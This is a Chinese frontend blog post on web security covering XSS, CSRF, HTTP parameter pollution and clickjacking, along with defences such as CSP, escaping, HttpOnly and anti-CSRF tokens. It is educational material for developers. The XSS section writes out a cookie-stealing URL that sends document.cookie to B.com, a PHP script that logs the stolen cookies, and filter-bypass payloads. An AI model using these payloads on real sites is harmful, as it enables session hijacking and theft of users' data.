<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://zhongsp.gitbooks.io/typescript-handbook/content/">https://zhongsp.gitbooks.io/typescript-handbook/content/</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/75214748">https://zhuanlan.zhihu.com/p/75214748</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6987735091925483551">https://juejin.cn/post/6987735091925483551</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6994102811218673700">https://juejin.cn/post/6994102811218673700</a><br><a target="_blank" rel="noopener" href="https://github.com/joye61/typescript-tutorial">https://github.com/joye61/typescript-tutorial</a><br><a target="_blank" rel="noopener" href="http://json.schemastore.org/tsconfig">http://json.schemastore.org/tsconfig</a><br><a target="_blank" rel="noopener" href="https://legacy.gitbook.com/book/zhongsp/typescript-handbook/details">https://legacy.gitbook.com/book/zhongsp/typescript-handbook/details</a><br><a target="_blank" rel="noopener" href="http://www.typescriptlang.org/">http://www.typescriptlang.org/</a><br><a target="_blank" rel="noopener" href="https://ts.xcatliu.com/">https://ts.xcatliu.com/</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/24267683">https://zhuanlan.zhihu.com/p/24267683</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58517848">https://zhuanlan.zhihu.com/p/58517848</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/66624970">https://zhuanlan.zhihu.com/p/66624970</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/39620591">https://zhuanlan.zhihu.com/p/39620591</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/64423022">https://zhuanlan.zhihu.com/p/64423022</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/40311981">https://zhuanlan.zhihu.com/p/40311981</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://catcherinsky.github.io/2021/08/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="CatcherInSky">
      <meta itemprop="description" content="CatcherInSky的前端知识库">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Knowlegde Bases of CatcherInSky">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-title-link" itemprop="url">网络安全</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-27 15:39:35" itemprop="dateCreated datePublished" datetime="2021-08-27T15:39:35+08:00">2021-08-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-14 19:41:05" itemprop="dateModified" datetime="2022-02-14T19:41:05+08:00">2022-02-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS (Cross-Site Scripting)，跨站脚本攻击，因为缩写和 CSS 重叠，所以只能叫 XSS。跨站脚本攻击是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。</p>
<p>跨站脚本攻击有可能造成以下影响:</p>
<ul>
<li>利用虚假输入表单骗取用户个人信息。</li>
<li>利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。</li>
<li>显示伪造的文章或图片。</li>
</ul>
<p><strong>XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的</strong>。</p>
<p><strong>理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在 XSS 漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于 script。</strong></p>
<p>XSS 的攻击方式千变万化，但还是可以大致细分为几种类型。</p>
<h3 id="非持久型-XSS（反射型-XSS）"><a href="#非持久型-XSS（反射型-XSS）" class="headerlink" title="非持久型 XSS（反射型 XSS）"></a>非持久型 XSS（反射型 XSS）</h3><p>非持久型 XSS 漏洞，一般是通过给别人发送<strong>带有恶意脚本代码参数的 URL</strong>，当 URL 地址被打开时，特有的恶意代码参数被 HTML 解析、执行。</p>
<p><img src="https://pic3.zhimg.com/80/v2-da3258e217ccc2b9cff316d97487f83e_hd.jpg#id=Prrty&originHeight=149&originWidth=732&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>假设某网站 <a target="_blank" rel="noopener" href="http://a.com/">http://A.com</a> 的某个输入框存在 XSS 漏洞，能通过输入框或者 URL 传入脚本执行。比如它的后端 php 代码是这样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ];</span><br></pre></td></tr></table></figure>

<p>那么，就可以在 url 中传入参数 name。生成 <strong>恶意 url</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A.<span class="property">com</span>/?name=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;B.com/ck.php?c=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>ck.php 文件代码如下，将获得的 cookie 存入 cookie.txt。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$cookie = $_GET[&#x27;c&#x27;];</span><br><span class="line">$ip = getenv (&#x27;REMOTE_ADDR&#x27;);</span><br><span class="line">$time=date(&quot;j F, Y, g:i a&quot;);</span><br><span class="line">$referer=getenv (&#x27;HTTP_REFERER&#x27;);</span><br><span class="line">$fp = fopen(&#x27;cookie.txt&#x27;, &#x27;a&#x27;);</span><br><span class="line">fwrite($fp, &#x27;Cookie: &#x27;.$cookie.&quot;\n&quot;.&#x27;IP: &#x27;.$ip.&quot;\n&quot;.&#x27;Date and Time: &#x27;.$time.&quot;\n&quot;.&#x27;Referer: &#x27;.$referer.&quot;\n\n&quot;);</span><br><span class="line">fclose($fp);</span><br></pre></td></tr></table></figure>

<p>通过短域名生成网站,将上诉 <strong>恶意 url</strong> 映射成类似<a target="_blank" rel="noopener" href="http://dwz.cn/B4l3Ydke%E7%9A%84%E7%BD%91%E5%9D%80%E6%AC%BA%E9%AA%97%E7%94%A8%E6%88%B7%EF%BC%8C%E5%8F%91%E9%80%81%E7%BB%99%E5%B7%B2%E7%BB%8F%E5%9C%A8[http://A.com](http://a.com/)%E7%99%BB%E5%BD%95%E7%9A%84%E7%94%A8%E6%88%B7%EF%BC%8C%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB%E4%B9%8B%E5%90%8E%EF%BC%8Ccookie%E4%BF%A1%E6%81%AF%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8%E4%BF%9D%E5%AD%98%E5%88%B0">http://dwz.cn/B4l3Ydke的网址欺骗用户，发送给已经在[http://A.com](http://a.com/)登录的用户，用户点击之后，cookie信息就会自动保存到</a> <a target="_blank" rel="noopener" href="http://b.com/">http://B.com</a>下的 cookie.txt 中。</p>
<p>通常，后端不会这么如此信任用户输入，会对各种输入进行正则过滤限制。针对各种过滤出现了对应的恶意 payload, 通过事件、通过协议、通过请求。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Script</span>&gt; 恶意代码 &lt;/script&gt;</span><br><span class="line">&lt;sc&lt;script&gt;ript&gt; 恶意代码 &lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">&quot; 恶意代码 &quot;</span> &gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position:fixed;top:0;left:0;bottom:0;right:0;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot; 恶意代码 &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">...</span></span><br></pre></td></tr></table></figure>

<p>以下代码通过 base64 编码，依旧能实现恶意攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiMSIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>

<p>攻击者可以直接通过 URL (类似：<code>https://xxx.com/xxx?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>) 注入可执行的脚本代码。不过一些浏览器如 Chrome 其内置了一些 XSS 过滤器，可以防止大部分反射型 XSS 攻击。</p>
<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul>
<li>即时性，不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据。</li>
<li>攻击者需要诱骗点击,必须要通过用户点击链接才能发起</li>
<li>反馈率低，所以较难发现和响应修复</li>
<li>盗取用户敏感保密信息</li>
</ul>
<h4 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h4><ul>
<li>Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端。</li>
<li>尽量不要从 <code>URL</code>，<code>document.referrer</code>，<code>document.forms</code> 等这种 DOM API 中获取数据直接渲染。</li>
<li>尽量不要使用 <code>eval</code>, <code>new Function()</code>，<code>document.write()</code>，<code>document.writeln()</code>，<code>window.setInterval()</code>，<code>window.setTimeout()</code>，<code>innerHTML</code>，<code>document.createElement()</code>等可执行字符串的方法。</li>
<li>如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义。</li>
<li>前端渲染的时候对任何的字段都需要做 escape 转义编码。</li>
</ul>
<h3 id="持久型-XSS（存储型-XSS）"><a href="#持久型-XSS（存储型-XSS）" class="headerlink" title="持久型 XSS（存储型 XSS）"></a>持久型 XSS（存储型 XSS）</h3><p>持久型 XSS 漏洞，一般存在于 Form 表单提交等交互功能，如文章留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。</p>
<p><img src="https://pic1.zhimg.com/80/v2-cf4f8235303f0892d2a50fe480b9d480_hd.jpg#id=cyQXY&originHeight=185&originWidth=595&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>举个例子，对于评论功能来说，就得防范持久型 XSS 攻击，因为我可以在评论中输入以下内容</p>
<p><img src="https://pic1.zhimg.com/80/v2-73842ddf6a856a44c3d4364c49e5e108_hd.jpg#id=ocJAM&originHeight=114&originWidth=652&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>主要注入页面方式和非持久型 XSS 漏洞类似，只不过持久型的不是来源于 URL，referer，forms 等，而是来源于<strong>后端从数据库中读出来的数据</strong> 。持久型 XSS 攻击不需要诱骗点击，黑客只需要在提交表单的地方完成注入即可，但是这种 XSS 攻击的成本相对还是很高。</p>
<h4 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h4><ul>
<li>POST 请求提交表单后端没做转义直接入库。</li>
<li>后端从数据库中取出数据没做转义直接输出给前端。</li>
<li>前端拿到后端数据没做转义直接渲染成 DOM。</li>
</ul>
<h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><ul>
<li>持久性，植入在数据库中</li>
<li>盗取用户敏感私密信息</li>
<li>危害面广</li>
</ul>
<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><p>客户端脚本通过 DOM 动态输出数据到页面，而不经过服务器，纯粹发生在客户端的攻击。 当前端出现以下代码时，就要小心了，确保等号右边的内容可控。实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。<br>DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">write</span> =</span><br><span class="line">innerHTML =</span><br><span class="line"><span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不好的例子</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> lang = <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">substring</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时可以通过以下payload注入</span></span><br><span class="line">A.<span class="property">com</span>?<span class="keyword">default</span>=<span class="title class_">German</span>#&lt;script&gt; 恶意代码 &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>大部分 xss 都是为了获得 cookie，进行下一步的破坏，因此系统层面也应考虑 cookie 有效期，HttpOnly 等方式。</strong></p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><h4 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h4><p>CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。</p>
<p>通常可以通过两种方式来开启 CSP：</p>
<ol>
<li>设置 HTTP Header 中的 Content-Security-Policy</li>
<li>设置 meta 标签的方式</li>
</ol>
<p>这里以设置 HTTP Header 来举例：</p>
<ul>
<li>只允许加载本站资源</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>只允许加载 HTTPS 协议图片</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: img-src https://*</span><br></pre></td></tr></table></figure>

<ul>
<li>允许加载任何来源框架</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: child-src &#x27;none&#x27;</span><br></pre></td></tr></table></figure>

<p>如需了解更多属性，请查看<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content-Security-Policy 文档</a></p>
<p>对于这种方式来说，只要开发者配置了正确的规则，那么即使网站存在漏洞，攻击者也不能执行它的攻击代码，并且 CSP 的兼容性也不错。</p>
<h4 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h4><p>用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escape</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quto;&#x27;</span>)</span><br><span class="line">  str = str.<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">  str = str.replace(/`/g, &#x27;</span><span class="string">`&#x27;)</span></span><br><span class="line"><span class="string">  str = str.replace(/\//g, &#x27;/&#x27;)</span></span><br><span class="line"><span class="string">  return str</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>但是对于显示富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xss = <span class="built_in">require</span>(<span class="string">&quot;xss&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> html = <span class="title function_">xss</span>(<span class="string">&#x27;&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(html);</span><br></pre></td></tr></table></figure>

<p>以上示例使用了 js-xss 来实现，可以看到在输出中保留了 h1 标签且过滤了 script 标签。</p>
<h4 id="HttpOnly-Cookie"><a href="#HttpOnly-Cookie" class="headerlink" title="HttpOnly Cookie"></a>HttpOnly Cookie</h4><p>这是预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序在设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息。</p>
<h3 id="富文本编辑器中-XSS-攻击的防范"><a href="#富文本编辑器中-XSS-攻击的防范" class="headerlink" title="富文本编辑器中 XSS 攻击的防范"></a>富文本编辑器中 XSS 攻击的防范</h3><ol>
<li>建立白名单就好，保留要用的标签，其他全部过滤</li>
<li>入数据库的时候 转义为实体字符，出库的时候还原，并过滤掉以下</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&lt;/script&gt;</span><br><span class="line">javascript:xxx;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>​</strong></p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF(Cross Site Request Forgery)，即跨站请求伪造，是一种常见的 Web 攻击，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>下面先介绍一下 CSRF 攻击的原理：</p>
<p><img src="https://pic1.zhimg.com/80/v2-226050bcad33410428e71165b2410440_hd.jpg#id=pjFfJ&originHeight=303&originWidth=432&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p><img src="https://pic3.zhimg.com/80/v2-5f5c6de58fcbc58703b3a3d83284e942_hd.jpg#id=VidmZ&originHeight=406&originWidth=720&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<p>完成 CSRF 攻击必须要有三个条件：</p>
<ol>
<li>用户已经登录了站点 A，并在本地记录了 cookie</li>
<li>在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点 A)。</li>
<li>站点 A 没有做任何 CSRF 防御</li>
</ol>
<p>我们来看一个例子： 当我们登入转账页面后，突然眼前一亮<strong>惊现”XXX 隐私照片，不看后悔一辈子”的链接</strong>，耐不住内心躁动，立马点击了该危险的网站（页面代码如下图所示），但当这页面一加载，便会执行<code>submitForm</code>这个方法来提交转账请求，从而将 10 块转给黑客。</p>
<p><img src="https://pic1.zhimg.com/80/v2-c549af63c3f0a490c9c24b5ce21155c8_hd.jpg#id=I95M9&originHeight=388&originWidth=548&originalType=binary%E2%88%B6=1&status=done&style=none"></p>
<h3 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h3><p>防范 CSRF 攻击可以遵循以下几种规则：<br>​</p>
<ul>
<li>Get 请求不对数据进行修改</li>
<li>不让第三方网站访问到用户 Cookie</li>
<li>阻止第三方网站请求接口</li>
<li>请求时附带验证信息，比如验证码或者 Token</li>
</ul>
<h4 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h4><p>可以对 Cookie 设置 SameSite 属性。该属性表示 Cookie 不随着跨域请求发送，可以很大程度减少 CSRF 的攻击，但是该属性目前并不是所有浏览器都兼容。</p>
<h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><p>HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求时，一般会带上 Referer 信息告诉服务器是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。可以通过检查请求的来源来防御 CSRF 攻击。正常请求的 referer 具有一定规律，如在提交表单的 referer 必定是在该页面发起的请求。所以<strong>通过检查 http 包头 referer 的值是不是这个页面，来判断是不是 CSRF 攻击</strong>。</p>
<p>但在某些情况下如从 https 跳转到 http，浏览器处于安全考虑，不会发送 referer，服务器就无法进行 check 了。若与该网站同域的其他网站有 XSS 漏洞，那么攻击者可以在其他网站注入恶意脚本，受害者进入了此类同域的网址，也会遭受攻击。出于以上原因，无法完全依赖 Referer Check 作为防御 CSRF 的主要手段。但是可以通过 Referer Check 来监控 CSRF 攻击的发生。</p>
<h4 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h4><p>目前比较完善的解决方案是加入 Anti-CSRF-Token。即发送请求时在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器建立一个拦截器来验证这个 token。服务器读取浏览器当前域 cookie 中这个 token 值，会进行校验该请求当中的 token 和 cookie 当中的 token 值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。</p>
<p><strong>这种方法相比 Referer 检查要安全很多</strong>，token 可以在用户登陆后产生并放于 session 或 cookie 中，然后在每次请求时服务器把 token 从 session 或 cookie 中拿出，与本次请求中的 token 进行比对。由于 token 的存在，攻击者无法再构造出一个完整的 URL 实施 CSRF 攻击。但在处理多个页面共存问题时，当某个页面消耗掉 token 后，其他页面的表单保存的还是被消耗掉的那个 token，其他页面的表单提交时会出现 token 错误。</p>
<p><strong>防范</strong></p>
<p>token：服务端预先生成一个随机数，在渲染具有表单的页面时将随机数以不可见的形式( visible:hidden )插入到表单域，客户端请求时带上这个随机数，服务端进行校验，确定请求确实来自该页面。</p>
<p>对于 B 网站，即使请求会带上 cookie，也由于获取不到该随机数（该随机数每次刷新页面都不一致），导致后端校验失败。</p>
<ul>
<li>Synchronizer Tokens：通过响应页面时将 token 渲染到页面上，在 form 表单提交的时候通过隐藏域提交上来。</li>
<li>Double Cookie Defense：将 token 设置在 Cookie 中，在提交（POST、PUT、PATCH、DELETE 等）请求时提交 Cookie，并通过 header 或者 body 带上 Cookie 中的 token，服务端进行对比校验。</li>
</ul>
<p>​</p>
<p>​</p>
<h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><p>应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制 CSRF 攻击。<strong>但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码</strong>。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。</p>
<h2 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h2><p>HTTP Parameter Pollution，HTTP 参数污染。在 HTTP 协议中是运行同样名称的参数出现多次，攻击者通过传播参数的时候传输 key 相同而 value 不同的参数，从而达到绕过某些防护与参数校验的后果。它是一种注入型的漏洞，攻击者通过在 HTTP 请求中插入特定的参数来发起攻击。</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>漏洞报告中是将 URL：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/blog/introducing-signal">https://hackerone.com/blog/introducing-signal</a></p>
</blockquote>
<p>修改为：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/blog/introducing-signal?&amp;u=https://me.ursb.me">https://hackerone.com/blog/introducing-signal?&amp;u=https://me.ursb.me</a></p>
</blockquote>
<p>当通过社交媒体链接分析内容时，此链接就会变成：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://me.ursb.me">https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://me.ursb.me</a></p>
</blockquote>
<p>这里，最后的参数 u 就会拥有比第一个更高的优先级，在 Facebook 分享时，Facebook 会跳转到 <a href="https://link.zhihu.com/?target=https://me.ursb.me/">https://me.ursb.me</a> 而非 hackerone。<br>​</p>
<h3 id="防御方法-2"><a href="#防御方法-2" class="headerlink" title="防御方法"></a>防御方法</h3><p>HPP 的行为主要取决于后端收到多个名称相同的参数时会如何处理。不同服务器处理方式不同<br><img src="https://cdn.nlark.com/yuque/0/2021/png/106384/1630054543248-3cf44eb2-4408-4153-a9dc-76a0aa8cc183.png#clientId=u1454f11f-1aed-4&from=paste&id=u8a07563f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=403&originWidth=691&originalType=url%E2%88%B6=1&size=159914&status=done&style=none&taskId=u2ce0e1c0-0d7a-4a8a-bebc-53d76f0c03f" alt="image.png"><br>我们需要注意 HTTP 协议是允许同名的参数的，在整个应用的处理过程中要意识到这一点从而根据业务的特征对这样的情况作正确的处理。当然要防止 HPP 漏洞，最重要的是后端一定要做好对输入参数的校验。</p>
<h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击。</p>
<h3 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h3><ul>
<li>隐蔽性较高，骗取用户操作</li>
<li>“UI-覆盖攻击”</li>
<li>利用 iframe 或者其它标签的属性</li>
</ul>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>用户在登陆 A 网站的系统后，被攻击者诱惑打开第三方网站，而第三方网站通过 iframe 引入了 A 网站的页面内容，用户在第三方网站中点击某个按钮（被装饰的按钮），实际上是点击了 A 网站的按钮。<br>接下来我们举个例子：我在优酷发布了很多视频，想让更多的人关注它，就可以通过点击劫持来实现</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 